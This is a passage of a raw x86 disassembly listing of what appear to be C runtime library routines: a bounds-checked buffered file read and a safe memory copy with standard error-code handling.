  4044b6:	8b f0                	mov    %eax,%esi
  4044b8:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4044bb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4044c2:	e8 15 00 00 00       	call   0x4044dc
  4044c7:	8b c6                	mov    %esi,%eax
  4044c9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4044cc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4044d3:	59                   	pop    %ecx
  4044d4:	5f                   	pop    %edi
  4044d5:	5e                   	pop    %esi
  4044d6:	5b                   	pop    %ebx
  4044d7:	c9                   	leave
  4044d8:	c3                   	ret
  4044d9:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4044dc:	85 f6                	test   %esi,%esi
  4044de:	75 09                	jne    0x4044e9
  4044e0:	ff 75 e4             	push   -0x1c(%ebp)
  4044e3:	e8 87 28 00 00       	call   0x406d6f
  4044e8:	59                   	pop    %ecx
  4044e9:	ff 75 e4             	push   -0x1c(%ebp)
  4044ec:	e8 fd 25 00 00       	call   0x406aee
  4044f1:	59                   	pop    %ecx
  4044f2:	c3                   	ret
  4044f3:	8b ff                	mov    %edi,%edi
  4044f5:	55                   	push   %ebp
  4044f6:	8b ec                	mov    %esp,%ebp
  4044f8:	6a 40                	push   $0x40
  4044fa:	ff 75 0c             	push   0xc(%ebp)
  4044fd:	ff 75 08             	push   0x8(%ebp)
  404500:	e8 37 ff ff ff       	call   0x40443c
  404505:	83 c4 0c             	add    $0xc,%esp
  404508:	5d                   	pop    %ebp
  404509:	c3                   	ret
  40450a:	8b ff                	mov    %edi,%edi
  40450c:	55                   	push   %ebp
  40450d:	8b ec                	mov    %esp,%ebp
  40450f:	83 ec 18             	sub    $0x18,%esp
  404512:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404516:	53                   	push   %ebx
  404517:	56                   	push   %esi
  404518:	8b 75 18             	mov    0x18(%ebp),%esi
  40451b:	57                   	push   %edi
  40451c:	74 1c                	je     0x40453a
  40451e:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  404522:	74 16                	je     0x40453a
  404524:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  404528:	75 17                	jne    0x404541
  40452a:	e8 c2 32 00 00       	call   0x4077f1
  40452f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404535:	e8 21 24 00 00       	call   0x40695b
  40453a:	33 c0                	xor    %eax,%eax
  40453c:	5f                   	pop    %edi
  40453d:	5e                   	pop    %esi
  40453e:	5b                   	pop    %ebx
  40453f:	c9                   	leave
  404540:	c3                   	ret
  404541:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404544:	85 f6                	test   %esi,%esi
  404546:	74 0d                	je     0x404555
  404548:	83 c8 ff             	or     $0xffffffff,%eax
  40454b:	33 d2                	xor    %edx,%edx
  40454d:	f7 75 10             	divl   0x10(%ebp)
  404550:	39 45 14             	cmp    %eax,0x14(%ebp)
  404553:	76 24                	jbe    0x404579
  404555:	83 ff ff             	cmp    $0xffffffff,%edi
  404558:	74 0e                	je     0x404568
  40455a:	57                   	push   %edi
  40455b:	6a 00                	push   $0x0
  40455d:	ff 75 08             	push   0x8(%ebp)
  404560:	e8 ab e2 ff ff       	call   0x402810
  404565:	83 c4 0c             	add    $0xc,%esp
  404568:	85 f6                	test   %esi,%esi
  40456a:	74 be                	je     0x40452a
  40456c:	83 c8 ff             	or     $0xffffffff,%eax
  40456f:	33 d2                	xor    %edx,%edx
  404571:	f7 75 10             	divl   0x10(%ebp)
  404574:	39 45 14             	cmp    %eax,0x14(%ebp)
  404577:	77 b1                	ja     0x40452a
  404579:	8b 46 0c             	mov    0xc(%esi),%eax
  40457c:	90                   	nop
  40457d:	a9 c0 04 00 00       	test   $0x4c0,%eax
  404582:	74 08                	je     0x40458c
  404584:	8b 46 18             	mov    0x18(%esi),%eax
  404587:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40458a:	eb 07                	jmp    0x404593
  40458c:	c7 45 f0 00 10 00 00 	movl   $0x1000,-0x10(%ebp)
  404593:	8b 5d 10             	mov    0x10(%ebp),%ebx
  404596:	8b d7                	mov    %edi,%edx
  404598:	0f af 5d 14          	imul   0x14(%ebp),%ebx
  40459c:	8b 45 08             	mov    0x8(%ebp),%eax
  40459f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045a2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4045a5:	8b cb                	mov    %ebx,%ecx
  4045a7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4045aa:	85 db                	test   %ebx,%ebx
  4045ac:	0f 84 de 00 00 00    	je     0x404690
  4045b2:	c7 45 e8 ff ff ff 7f 	movl   $0x7fffffff,-0x18(%ebp)
  4045b9:	8b 46 0c             	mov    0xc(%esi),%eax
  4045bc:	90                   	nop
  4045bd:	a9 c0 04 00 00       	test   $0x4c0,%eax
  4045c2:	74 43                	je     0x404607
  4045c4:	8b 46 08             	mov    0x8(%esi),%eax
  4045c7:	85 c0                	test   %eax,%eax
  4045c9:	74 3c                	je     0x404607
  4045cb:	0f 88 ea 00 00 00    	js     0x4046bb
  4045d1:	3b c8                	cmp    %eax,%ecx
  4045d3:	0f 42 c1             	cmovb  %ecx,%eax
  4045d6:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4045d9:	3b c2                	cmp    %edx,%eax
  4045db:	0f 87 b7 00 00 00    	ja     0x404698
  4045e1:	50                   	push   %eax
  4045e2:	ff 36                	push   (%esi)
  4045e4:	52                   	push   %edx
  4045e5:	ff 75 f8             	push   -0x8(%ebp)
  4045e8:	e8 ab 01 00 00       	call   0x404798
  4045ed:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4045f0:	83 c4 10             	add    $0x10,%esp
  4045f3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4045f6:	29 46 08             	sub    %eax,0x8(%esi)
  4045f9:	2b c8                	sub    %eax,%ecx
  4045fb:	01 06                	add    %eax,(%esi)
  4045fd:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404600:	01 45 f8             	add    %eax,-0x8(%ebp)
  404603:	2b d0                	sub    %eax,%edx
  404605:	eb 7b                	jmp    0x404682
  404607:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40460a:	3b c8                	cmp    %eax,%ecx
  40460c:	72 4b                	jb     0x404659
  40460e:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  404614:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404617:	0f 47 4d e8          	cmova  -0x18(%ebp),%ecx
  40461b:	85 c0                	test   %eax,%eax
  40461d:	74 0c                	je     0x40462b
  40461f:	33 d2                	xor    %edx,%edx
  404621:	8b c1                	mov    %ecx,%eax
  404623:	f7 75 f0             	divl   -0x10(%ebp)
  404626:	2b ca                	sub    %edx,%ecx
  404628:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40462b:	3b ca                	cmp    %edx,%ecx
  40462d:	77 69                	ja     0x404698
  40462f:	8b 46 04             	mov    0x4(%esi),%eax
  404632:	83 66 08 00          	andl   $0x0,0x8(%esi)
  404636:	51                   	push   %ecx
  404637:	ff 75 f8             	push   -0x8(%ebp)
  40463a:	89 06                	mov    %eax,(%esi)
  40463c:	56                   	push   %esi
  40463d:	e8 5d 23 00 00       	call   0x40699f
  404642:	59                   	pop    %ecx
  404643:	50                   	push   %eax
  404644:	e8 a0 3b 00 00       	call   0x4081e9
  404649:	83 c4 0c             	add    $0xc,%esp
  40464c:	85 c0                	test   %eax,%eax
  40464e:	74 76                	je     0x4046c6
  404650:	78 69                	js     0x4046bb
  404652:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404655:	2b c8                	sub    %eax,%ecx
  404657:	eb a4                	jmp    0x4045fd
  404659:	56                   	push   %esi
  40465a:	e8 a1 40 00 00       	call   0x408700
  40465f:	59                   	pop    %ecx
  404660:	8b c8                	mov    %eax,%ecx
  404662:	83 f9 ff             	cmp    $0xffffffff,%ecx
  404665:	74 68                	je     0x4046cf
  404667:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40466a:	85 d2                	test   %edx,%edx
  40466c:	74 2a                	je     0x404698
  40466e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404671:	88 08                	mov    %cl,(%eax)
  404673:	40                   	inc    %eax
  404674:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404677:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40467a:	49                   	dec    %ecx
  40467b:	8b 46 18             	mov    0x18(%esi),%eax
  40467e:	4a                   	dec    %edx
  40467f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404682:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404685:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404688:	85 c9                	test   %ecx,%ecx
  40468a:	0f 85 29 ff ff ff    	jne    0x4045b9
  404690:	8b 45 14             	mov    0x14(%ebp),%eax
  404693:	e9 a4 fe ff ff       	jmp    0x40453c
  404698:	83 ff ff             	cmp    $0xffffffff,%edi
  40469b:	74 0e                	je     0x4046ab
  40469d:	57                   	push   %edi
  40469e:	6a 00                	push   $0x0
  4046a0:	ff 75 08             	push   0x8(%ebp)
  4046a3:	e8 68 e1 ff ff       	call   0x402810
  4046a8:	83 c4 0c             	add    $0xc,%esp
  4046ab:	e8 41 31 00 00       	call   0x4077f1
  4046b0:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  4046b6:	e9 7a fe ff ff       	jmp    0x404535
  4046bb:	6a 10                	push   $0x10
  4046bd:	58                   	pop    %eax
  4046be:	8d 4e 0c             	lea    0xc(%esi),%ecx
  4046c1:	f0 09 01             	lock or %eax,(%ecx)
  4046c4:	eb 09                	jmp    0x4046cf
  4046c6:	6a 08                	push   $0x8
  4046c8:	59                   	pop    %ecx
  4046c9:	8d 46 0c             	lea    0xc(%esi),%eax
  4046cc:	f0 09 08             	lock or %ecx,(%eax)
  4046cf:	2b 5d fc             	sub    -0x4(%ebp),%ebx
  4046d2:	33 d2                	xor    %edx,%edx
  4046d4:	8b c3                	mov    %ebx,%eax
  4046d6:	f7 75 10             	divl   0x10(%ebp)
  4046d9:	e9 5e fe ff ff       	jmp    0x40453c
  4046de:	8b ff                	mov    %edi,%edi
  4046e0:	55                   	push   %ebp
  4046e1:	8b ec                	mov    %esp,%ebp
  4046e3:	ff 75 14             	push   0x14(%ebp)
  4046e6:	ff 75 10             	push   0x10(%ebp)
  4046e9:	ff 75 0c             	push   0xc(%ebp)
  4046ec:	6a ff                	push   $0xffffffff
  4046ee:	ff 75 08             	push   0x8(%ebp)
  4046f1:	e8 05 00 00 00       	call   0x4046fb
  4046f6:	83 c4 14             	add    $0x14,%esp
  4046f9:	5d                   	pop    %ebp
  4046fa:	c3                   	ret
  4046fb:	6a 0c                	push   $0xc
  4046fd:	68 40 76 41 00       	push   $0x417640
  404702:	e8 09 d3 ff ff       	call   0x401a10
  404707:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40470b:	74 32                	je     0x40473f
  40470d:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  404711:	74 2c                	je     0x40473f
  404713:	8b 75 18             	mov    0x18(%ebp),%esi
  404716:	85 f6                	test   %esi,%esi
  404718:	75 37                	jne    0x404751
  40471a:	83 7d 0c ff          	cmpl   $0xffffffff,0xc(%ebp)
  40471e:	74 0f                	je     0x40472f
  404720:	ff 75 0c             	push   0xc(%ebp)
  404723:	56                   	push   %esi
  404724:	ff 75 08             	push   0x8(%ebp)
  404727:	e8 e4 e0 ff ff       	call   0x402810
  40472c:	83 c4 0c             	add    $0xc,%esp
  40472f:	e8 bd 30 00 00       	call   0x4077f1
  404734:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40473a:	e8 1c 22 00 00       	call   0x40695b
  40473f:	33 c0                	xor    %eax,%eax
  404741:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404744:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40474b:	59                   	pop    %ecx
  40474c:	5f                   	pop    %edi
  40474d:	5e                   	pop    %esi
  40474e:	5b                   	pop    %ebx
  40474f:	c9                   	leave
  404750:	c3                   	ret
  404751:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  404755:	56                   	push   %esi
  404756:	e8 7f 23 00 00       	call   0x406ada
  40475b:	59                   	pop    %ecx
  40475c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404760:	56                   	push   %esi
  404761:	ff 75 14             	push   0x14(%ebp)
  404764:	ff 75 10             	push   0x10(%ebp)
  404767:	ff 75 0c             	push   0xc(%ebp)
  40476a:	ff 75 08             	push   0x8(%ebp)
  40476d:	e8 98 fd ff ff       	call   0x40450a
  404772:	83 c4 14             	add    $0x14,%esp
  404775:	8b f8                	mov    %eax,%edi
  404777:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40477a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404781:	e8 0a 00 00 00       	call   0x404790
  404786:	8b c7                	mov    %edi,%eax
  404788:	eb b7                	jmp    0x404741
  40478a:	8b 75 18             	mov    0x18(%ebp),%esi
  40478d:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  404790:	56                   	push   %esi
  404791:	e8 58 23 00 00       	call   0x406aee
  404796:	59                   	pop    %ecx
  404797:	c3                   	ret
  404798:	8b ff                	mov    %edi,%edi
  40479a:	55                   	push   %ebp
  40479b:	8b ec                	mov    %esp,%ebp
  40479d:	56                   	push   %esi
  40479e:	8b 75 14             	mov    0x14(%ebp),%esi
  4047a1:	85 f6                	test   %esi,%esi
  4047a3:	75 04                	jne    0x4047a9
  4047a5:	33 c0                	xor    %eax,%eax
  4047a7:	eb 6d                	jmp    0x404816
  4047a9:	8b 45 08             	mov    0x8(%ebp),%eax
  4047ac:	85 c0                	test   %eax,%eax
  4047ae:	75 13                	jne    0x4047c3
  4047b0:	e8 3c 30 00 00       	call   0x4077f1
  4047b5:	6a 16                	push   $0x16
  4047b7:	5e                   	pop    %esi
  4047b8:	89 30                	mov    %esi,(%eax)
  4047ba:	e8 9c 21 00 00       	call   0x40695b
  4047bf:	8b c6                	mov    %esi,%eax
  4047c1:	eb 53                	jmp    0x404816
  4047c3:	57                   	push   %edi
  4047c4:	8b 7d 10             	mov    0x10(%ebp),%edi
  4047c7:	85 ff                	test   %edi,%edi
  4047c9:	74 14                	je     0x4047df
  4047cb:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4047ce:	72 0f                	jb     0x4047df
  4047d0:	56                   	push   %esi
  4047d1:	57                   	push   %edi
  4047d2:	50                   	push   %eax
  4047d3:	e8 d8 d6 ff ff       	call   0x401eb0
  4047d8:	83 c4 0c             	add    $0xc,%esp
  4047db:	33 c0                	xor    %eax,%eax
  4047dd:	eb 36                	jmp    0x404815
  4047df:	ff 75 0c             	push   0xc(%ebp)
  4047e2:	6a 00                	push   $0x0
  4047e4:	50                   	push   %eax
  4047e5:	e8 26 e0 ff ff       	call   0x402810
  4047ea:	83 c4 0c             	add    $0xc,%esp
  4047ed:	85 ff                	test   %edi,%edi
  4047ef:	75 09                	jne    0x4047fa
  4047f1:	e8 fb 2f 00 00       	call   0x4077f1
  4047f6:	6a 16                	push   $0x16
  4047f8:	eb 0c                	jmp    0x404806
  4047fa:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4047fd:	73 13                	jae    0x404812
  4047ff:	e8 ed 2f 00 00       	call   0x4077f1
  404804:	6a 22                	push   $0x22
  404806:	5e                   	pop    %esi
  404807:	89 30                	mov    %esi,(%eax)
  404809:	e8 4d 21 00 00       	call   0x40695b
  40480e:	8b c6                	mov    %esi,%eax
  404810:	eb 03                	jmp    0x404815
  404812:	6a 16                	push   $0x16
  404814:	58                   	pop    %eax
  404815:	5f                   	pop    %edi
  404816:	5e                   	pop    %esi
  404817:	5d                   	pop    %ebp
  404818:	c3                   	ret
  404819:	8b ff                	mov    %edi,%edi
  40481b:	55                   	push   %ebp
  40481c:	8b ec                	mov    %esp,%ebp
  40481e:	53                   	push   %ebx
  40481f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404822:	2b 5d 10             	sub    0x10(%ebp),%ebx
  404825:	56                   	push   %esi
  404826:	57                   	push   %edi
  404827:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40482a:	1b 7d 14             	sbb    0x14(%ebp),%edi
  40482d:	33 c9                	xor    %ecx,%ecx
  40482f:	33 c0                	xor    %eax,%eax
  404831:	41                   	inc    %ecx
  404832:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404835:	7f 0b                	jg     0x404842
  404837:	7c 05                	jl     0x40483e
  404839:	39 45 08             	cmp    %eax,0x8(%ebp)
  40483c:	73 04                	jae    0x404842
  40483e:	8b f1                	mov    %ecx,%esi
  404840:	eb 02                	jmp    0x404844
  404842:	8b f0                	mov    %eax,%esi
